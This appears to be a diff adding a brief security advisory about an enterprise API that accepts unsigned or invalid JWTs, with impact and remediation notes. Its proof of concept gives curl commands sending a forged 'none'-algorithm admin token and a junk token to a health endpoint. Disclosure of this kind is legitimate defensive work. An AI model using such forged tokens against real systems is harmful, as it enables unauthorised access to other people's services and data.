@@ -1,0 +1,48 @@
+AUTHENTICATION LAYER SYSTEMIC BYPASS
+
+Discovery Date: November 2024
+Disclosure Date: November 2024
+Vendor Status: Investigating
+CVSS Score: 9.1 (Critical)
+
+Executive Summary
+Identified complete authentication bypass in enterprise API platform through systemic JWT validation failures, accepting tokens with invalid signatures, insecure algorithms, and arbitrary claims without cryptographic verification.
+
+Technical Details
+
+JWT validation accepts none algorithm tokens
+
+No signature verification for RS256/HS256 algorithms
+
+Arbitrary key ID (KID) values accepted without verification
+
+No structural validation of token claims or expiration
+
+Proof of Concept
+
+
+# All tokens return HTTP 200 - No validation
+curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
+https://api.platform.com/health
+
+curl -H "Authorization: Bearer invalid.signature.here" \
+https://api.platform.com/health
+Impact
+
+Complete platform authentication compromise
+
+Customer data exposure and API configuration access
+
+Service takeover through administrative claim injection
+
+Enterprise trust and reputation damage
+
+Remediation
+
+Implement proper JWT validation using standard libraries
+
+Reject tokens with none algorithm
+
+Verify signatures against trusted public keys
+
+Add token expiration and claim validation
